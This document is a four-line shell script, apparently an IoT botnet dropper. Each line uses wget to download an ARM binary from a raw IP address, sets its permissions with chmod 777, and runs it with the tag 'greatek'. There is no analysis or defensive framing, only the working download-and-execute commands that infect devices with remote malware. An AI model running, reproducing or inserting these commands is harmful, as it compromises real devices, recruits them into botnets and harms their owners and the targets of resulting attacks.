wget http://45.95.146.126/arm; chmod 777 arm; ./arm greatek
wget http://45.95.146.126/arm5; chmod 777 arm5; ./arm5 greatek
wget http://45.95.146.126/arm6; chmod 777 arm6; ./arm6 greatek
wget http://45.95.146.126/arm7; chmod 777 arm7; ./arm7 greatek
